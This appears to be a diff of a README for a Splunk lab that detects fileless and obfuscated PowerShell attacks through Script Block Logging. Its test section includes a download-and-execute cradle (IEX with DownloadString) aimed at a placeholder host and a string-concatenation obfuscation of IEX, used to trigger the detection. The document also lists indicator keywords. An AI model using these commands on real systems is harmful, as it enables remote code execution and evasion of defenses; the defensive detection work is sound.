@@ -1,29 +1,41 @@
-# Detection: PowerShell Script Block Logging (Event ID 4104)
+# Detection 02: PowerShell Script Block Analysis (Event ID 4104)
 
-## Objective
+> Detection of fileless and obfuscated PowerShell attacks using Script Block Logging in Splunk.
 
-Detect malicious PowerShell activity by analyzing script block logs that capture executed code.
+## Problem Statement
 
----
+Attackers frequently use PowerShell for fileless attacks, leveraging obfuscation and in-memory execution to evade traditional detection methods.
+
+Process creation logs alone (Sysmon Event ID 1) do not capture actual script content, creating a visibility gap.
+
+
+
+## Detection Objective
+
+Leverage PowerShell Script Block Logging (Event ID 4104) to detect malicious script execution by analyzing encoded payloads, obfuscation patterns, and suspicious functions.
+
+## Lab Environment
+
+- Splunk Enterprise
+- Windows Endpoint
+- PowerShell Script Block Logging Enabled
+- Simulated attack execution
+
 
 ## Detection Metadata
 
 - Detection Name: PowerShell Script Block Analysis
 - Severity: High
-- MITRE ATT&CK:
-  - T1059.001 (PowerShell)
-  - T1027 (Obfuscated Files or Information)
-  - T1105 (Ingress Tool Transfer)
 
-  ---
+  
 
-## Data Source
+## Data Sources
 
 - Windows Event Logs
 - Event ID: 4104
 - Log Source: Microsoft-Windows-PowerShell/Operational
 
----
+
 
 ## Step 1 — Validate 4104 Logs
 
@@ -37,7 +49,7 @@ index=main EventCode=4104
 | stats count by host
 ```
 ![4104 Validation](screenshots/01_4104_validation.png)
----
+
 
 ## Step 2 — RAW VIEW
 
@@ -52,7 +64,7 @@ index=main EventCode=4104
 ```
 ![Script Content](screenshots/02_script_content.png)
 
----
+
 
 ## Step 3 — ENCODED
 
@@ -68,7 +80,7 @@ index=main EventCode=4104
 ```
 ![Encoded Detection](screenshots/03_encoded_detection.png)
 
----
+
 
 ## Step 4 — Detect Suspicious Functions
 
@@ -84,7 +96,7 @@ index=main EventCode=4104
 ```
 ![Suspicious Functions](screenshots/04_suspicious_functions.png)
 
----
+
 
 ## Step 5 — Detect Obfuscation Patterns
 
@@ -110,9 +122,9 @@ Therefore, detection focuses on observable indicators such as:
 - DownloadString
 - ExecutionPolicy bypass
 
----
 
-## Step 6 — High-Fidelity Detection
+
+## Step 6 — Final Detection Logic (Production Ready)
 
 Combine multiple suspicious indicators.
 This step combines multiple suspicious indicators to create a high-confidence detection.
@@ -140,7 +152,7 @@ This approach allows analysts to quickly identify affected hosts and review asso
 
 
 
----
+
 
 ## Multi-Stage Correlation
 
@@ -154,7 +166,7 @@ By linking suspicious script content (Event ID 4104) with PowerShell execution e
 
 This multi-stage approach aligns with real SOC detection strategies and improves confidence in identifying true attacks.
 
----
+
 
 ## Investigation Workflow
 
@@ -165,7 +177,7 @@ This multi-stage approach aligns with real SOC detection strategies and improves
 5. Investigate any external connections or downloads
 6. Determine if the activity is legitimate or malicious
 
----
+
 
 ## Incident Scenario (Case Study)
 
@@ -179,7 +191,7 @@ The detection successfully identified:
 
 This demonstrates the effectiveness of script block logging in detecting fileless attacks.
 
----
+
 
 ## Detection Rationale
 
@@ -193,7 +205,7 @@ This allows detection of:
 - Remote payload execution
 
 
----
+
 
 ## Detection Validation
 
@@ -203,7 +215,7 @@ Validated using:
 - IEX execution
 - DownloadString attack simulation
 
----
+
 
 ## Noise Considerations
 
@@ -213,7 +225,7 @@ Legitimate scripts may trigger alerts:
 - DevOps pipelines
 - Software installation scripts
 
----
+
 
 ## Detection Tuning Strategy
 
@@ -226,7 +238,7 @@ Example:
 ```spl
 | where count > 2
 ```
----
+
 
 ## Detection Limitations
 
@@ -234,22 +246,26 @@ Example:
 - High volume of logs may impact performance
 - Advanced obfuscation techniques may evade simple pattern matching
 
+## MITRE ATT&CK Mapping
 
----
+- T1059.001 — PowerShell
+- T1027 — Obfuscated Files or Information
+- T1105 — Ingress Tool Transfer
+
 
 ## Impact
 
 This detection enhances visibility into PowerShell activity and enables early identification of fileless attacks, significantly improving SOC detection capabilities.
 
----
 
-## BEFORE YOU RUN ANY QUERY
+
+## Lab Setup & Test Execution
 
 ### CRITICAL REQUIREMENT
 
 You must enable **PowerShell Script Block Logging**
 
----
+
 
 ### ENABLE LOGGING (VERY IMPORTANT)
 
@@ -284,6 +300,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://example.com')
 ```powershell
 $cmd="I"+"EX"; &($cmd) "Write-Output 'Test'"
 ```
+
+## Outcome
+
+Successfully detected fileless PowerShell attacks including encoded payloads, obfuscated scripts, and remote command execution using script block analysis, significantly improving visibility beyond process-based detection.
 
 ## Related Detections
 
